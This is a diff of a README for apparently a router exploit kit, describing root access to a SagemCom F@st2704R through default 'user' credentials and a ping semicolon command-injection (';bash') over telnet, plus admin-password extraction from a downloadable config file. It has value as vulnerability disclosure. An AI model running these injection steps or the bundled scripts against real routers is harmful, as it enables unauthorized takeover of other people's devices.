@@ -6,11 +6,11 @@ Basically, if you don't know the admin password of your **SagemCom F@st2704R** r
 
 
 ### Included
-`root.sh` is a simple shell script that provides the root shell
+`root.sh` is a simple shell script that provides the root shell. It interracts with telnet on **port 23**.
 
-`admin.py` is a python script that downloads the router's configuration file and extracts the admin password. You don't need to crack `/etc/passwd` anymore!
+`admin.py` is a python script that downloads the router's configuration file and extracts the admin password. You don't need to crack `/etc/passwd` anymore! It interracts with the web interface on **port 80**
 
-`getHashes.sh` uses the same login principle as **root.sh** but automatically downloads the remote /etc/passwd file in a local directory instead of letting the user interact with the shell. ~~You can later crack the DES hashes with a password cracking tool.~~ You can use `admin.py` instead
+`getHashes.sh` uses the same login principle as **root.sh** but automatically downloads the remote /etc/passwd file in a local directory instead of letting the user interact with the shell. ~~You can later crack the DES hashes with a password cracking tool.~~ You can use `admin.py` instead if the web service is running on the device.
 
 `lsFileList.txt` is the complete list of files on the device.
 
@@ -168,13 +168,7 @@ I wonder if... Let's try some semicolon magic!
 telnetd:error:997.792:processInput:406:unrecognized command ls
  >
  >
- > ping -c 1 127.0.0.1;ls
-PING 127.0.0.1 (127.0.0.1): 56 data bytes
-64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.948 ms
-
---- 127.0.0.1 ping statistics ---
-1 packets transmitted, 1 packets received, 0% packet loss
-round-trip min/avg/max = 0.948/0.948/0.948 ms
+ > ping -c 1 127.0.0.1 > /dev/null; ls
 bin      etc      mnt      sbin     usr      webs-EN
 data     lib      opt      sys      var      webs-FR
 dev      linuxrc  proc     tmp      webs
@@ -183,13 +177,7 @@ dev      linuxrc  proc     tmp      webs
 Alright! this way I can get a real shell
 
 ```
- > ping -c 1 127.0.0.1;bash
-PING 127.0.0.1 (127.0.0.1): 56 data bytes
-64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.459 ms
-
---- 127.0.0.1 ping statistics ---
-1 packets transmitted, 1 packets received, 0% packet loss
-round-trip min/avg/max = 0.459/0.459/0.459 ms
+ > ping -c 1 127.0.0.1 > dev/null; bash
 
 
 BusyBox v1.17.2 (2013-09-30 17:48:17 CST) built-in shell (ash)
@@ -199,11 +187,12 @@ Enter 'help' for a list of built-in commands.
 ```
 
  Using the username `user` and the default password `user` followed by this ping/semicolon loophole gives us access to a shell with administrative rights more easiy than brute-forcing the admin's password (default 4 letters, can be changed for another one up to 16 letters).
+ 
+ Also, turns out any user can download the device's config file where the admin password is encoded with base64. Well that's security eh.
 
- **Automated shell script included lucky bastard!**
-
+ **Automated shell script included lucky bastard!**  
  **Remember you still have to deal with squashfs read-only filesystem!**
 
- Honestly I didn't push my research really far. Maybe this has been documented before and maybe the firmware is available somewhere (I might dump it in a few days... or months). If this is the case, contact me.
+ Honestly I didn't push my research really far. Maybe this has been documented before and maybe the firmware is available somewhere (I might dump it in a few days... or months… or years). If this is the case, contact me.
 
  ~ Mixbo www.wakowakowako.com
